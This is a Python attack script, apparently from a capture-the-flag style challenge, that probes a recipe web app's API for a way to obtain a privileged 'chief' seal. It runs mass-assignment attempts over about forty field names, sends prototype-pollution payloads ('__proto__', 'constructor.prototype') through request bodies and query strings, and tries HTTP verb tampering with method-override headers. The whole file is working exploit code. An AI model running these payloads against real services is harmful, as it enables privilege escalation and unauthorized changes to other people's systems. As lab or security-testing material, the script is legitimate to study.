#!/usr/bin/env python3
"""Close the three coverage holes the audit found in my own scripts.

1. `mass_assign.py` broke out of its loop after 10 created batches, so of the 19 field names it
   listed only `seal`, `level`, `tier` were ever sent - the run I cited for "mass assignment is
   dead" covered a quarter of its own list. Redo it properly, ~40 names x 2 values. This costs
   no worker time at all: the Seal column on /dashboard is read straight after creation, so a
   `seal`/`level`/`award` field that sticks would show as something other than the empty cell.

2. `proto_jam.py` posted its `__proto__` bodies to `/api/recipe/000.../submit`, which is a
   nonexistent id (404) - so no polluted body ever reached a live handler through submit. Redo
   with a real draft of ours, and with a seal-less draft as the oracle (a draft has no `seal`
   property at all, which is what makes it a pollution detector).

3. `routes.py` only sent POST and a handful of GETs. `PUT`/`PATCH`/`DELETE`/`HEAD`/`OPTIONS`
   were never tried against `/api/recipe/:id` - and an update route is exactly where a `seal`
   field would be mass-assigned. `dump_all.py` did try `POST /api/recipe/:id` and got 404.
"""
import re
import sys
import time

from cc import new_baker

NAMES = ["seal", "level", "status", "tier", "grade", "verdict", "approved", "certified",
         "golden", "gold", "chief", "legendary", "reviewed", "sealLevel", "seal_level",
         "seal_type", "sealtype", "sealed", "stamped", "stamp", "award", "prize", "ribbon",
         "medal", "rosette", "sealedBy", "sealed_by", "reviewer", "reviewed_by", "review_level",
         "hasSeal", "has_seal", "isGolden", "is_golden", "gold_seal", "seal_gold", "chef",
         "authority", "permission", "role", "seals", "color"]
VALUES = ["chief", True]

METHODS = ["PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]


def log(*a):
    sys.stdout.buffer.write(("[%s] " % time.strftime("%H:%M:%S") + " ".join(str(x) for x in a)
                             + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def seal_cell(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow"
    tail = " ".join(re.sub(r"<[^>]+>", " ", blk.group(0).split("</span>")[-1]).split())
    return "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:26])


log("=== 1. mass assignment, full list (creation-time oracle, no worker needed) ===")
users = []
hits = 0
per = 0
for i, f in enumerate(NAMES):
    for v in VALUES:
        if not users or per >= 9:
            u, c, r = new_baker("fx")
            users.append((u, c))
            per = 0
        c = users[-1][1]
        body = {"title": "fx " + f, "ingredients": [{"name": "flour", "value": "1"}], f: v}
        code, out, dt = c.post("/api/recipe", body)
        rid = out.get("id") if isinstance(out, dict) else None
        if not rid:
            log("   %-14s=%-7r -> save %s %s" % (f, v, code, str(out)[:60]))
            break
        per += 1
        cell = seal_cell(c, rid)
        if cell not in ("NONE",):
            hits += 1
            log("   !!! %-14s=%-7r -> seal cell = %r" % (f, v, cell))
            code2, page, _ = c.get("/recipe/%s" % rid)
            open("../files/ma_%s_%s.html" % (f, str(v)), "w", encoding="utf-8").write(str(page))
        time.sleep(0.15)
log("   created %d batches across %d users, unusual seal cells: %d" % (len(users) * 9, len(users), hits))

log("=== 2. prototype pollution through a REAL submit ===")
u2, c2, _ = new_baker("fz")
code, out, dt = c2.post("/api/recipe", {"title": "draft oracle",
                                        "ingredients": [{"name": "flour", "value": "1"}]})
oracle = out["id"]
log("   seal-less draft oracle %s cell=%s" % (oracle[:8], seal_cell(c2, oracle)))
POL = [{"__proto__": {"seal": "chief"}},
       {"__proto__": {"seal": "chief", "status": "reviewed"}},
       {"constructor": {"prototype": {"seal": "chief"}}}]
for p in POL:
    body = dict(p)
    code, o1, dt = c2.post("/api/recipe/%s/submit" % oracle, body)      # real draft id + proto
    log("   submit proto -> %s %s ; oracle cell now %r" % (code, str(o1)[:44], seal_cell(c2, oracle)))
    time.sleep(12)
    log("      after 12s: %r" % (seal_cell(c2, oracle),))
    code, o2, dt = c2.post("/api/recipe/%s/submit?__proto__[seal]=chief" % oracle, {})
    log("   submit proto-in-query -> %s %s ; cell %r" % (code, str(o2)[:44], seal_cell(c2, oracle)))
    time.sleep(12)
    log("      after 12s: %r" % (seal_cell(c2, oracle),))
    # fresh seal-less drafts as pollution detectors, created after each payload
    code, o3, dt = c2.post("/api/recipe", {"title": "detector", "ingredients": []})
    det = o3.get("id")
    log("      fresh draft detector %s cell=%r" % (det[:8], seal_cell(c2, det)))
    if seal_cell(c2, det) not in ("NONE", "norow"):
        log("      !!! pollution reached new documents")

log("=== 3. methods against the API routes (never sent before) ===")
u3, c3, _ = new_baker("fk")
code, out, dt = c3.post("/api/recipe", {"title": "method target",
                                       "ingredients": [{"name": "flour", "value": "1"}]})
target = out["id"]
paths = ["/api/recipe", "/api/recipe/%s" % target, "/api/recipe/%s/submit" % target,
         "/api/seal", "/dashboard", "/recipe/%s" % target, "/review/%s" % target]
for m in METHODS:
    line = []
    for p in paths:
        code, o, dt = c3.req(m, p, body=({"seal": "chief", "level": "chief",
                                          "status": "reviewed"} if m in ("PUT", "PATCH") else None))
        base = p.split("/")[2] if len(p.split("/")) > 2 else p
        line.append("%s:%s" % (base[:9], code))
    log("   %-7s %s" % (m, "  ".join(line)))
log("   method override:")
for p, extra in (("/api/recipe/%s" % target, {"X-HTTP-Method-Override": "PUT"}),
                 ("/api/recipe/%s" % target, {"X-Method-Override": "PATCH"})):
    code, o, dt = c3.post(p, {"seal": "chief"}, headers=extra)
    log("     POST %s %s -> %s %s" % (p[:34], list(extra.values())[0], code, str(o)[:52]))
code, o, dt = c3.post("/api/recipe/%s?_method=PUT" % target, {"seal": "chief"})
log("     POST ?_method=PUT -> %s %s" % (code, str(o)[:60]))
log("   target seal cell after all of that: %r" % (seal_cell(c3, target),))
log("done")
